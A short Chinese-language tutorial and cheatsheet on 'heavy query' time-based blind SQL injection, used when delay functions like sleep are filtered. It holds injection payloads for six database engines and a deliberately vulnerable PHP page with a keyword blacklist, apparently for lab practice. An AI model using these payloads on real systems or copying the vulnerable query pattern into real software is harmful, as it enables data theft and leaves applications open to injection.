## 为什么需要大负荷查询

当一些造成时间延迟的函数无法在注入中使用的时候，例如 mysql 以下这些函数被过滤的情况：

- sleep
- benchmark
- Get_lock
- 或许有更多

我们可以使用 **heavy query** 进行延时注入，使数据库的查询时间尽量变长。例如让 information_schema 的两个大表做笛卡尔积等语句。注: 使用 benchmark 进行注入原则上也属于 heavy query 的范围内, 但这里不再描述。

## cheatsheet

- PostgreSQL
    - AND 2333=(SELECT COUNT(*) FROM GENERATE_SERIES(1,1000000000))
- MSSQL
    - AND 2333=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
- Oracle
    - AND 2333=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
- IBM DB2
    - AND 2333=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
- SQLite
    - AND 23333=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))
- Mysql
    - AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);

## 参考

- https://www.anquanke.com/post/id/104319

## 代码

```php
<?php
$id = $_GET['id'];
if(preg_match("/(sleep|benchmark|outfile|dumpfile|load_file|join)/i", $_GET['id']))
{
    die("you bad bad!");
}
mysql_query("SELECT * FROM `articles` WHERE  id = '" . $id . "'");
?>
```

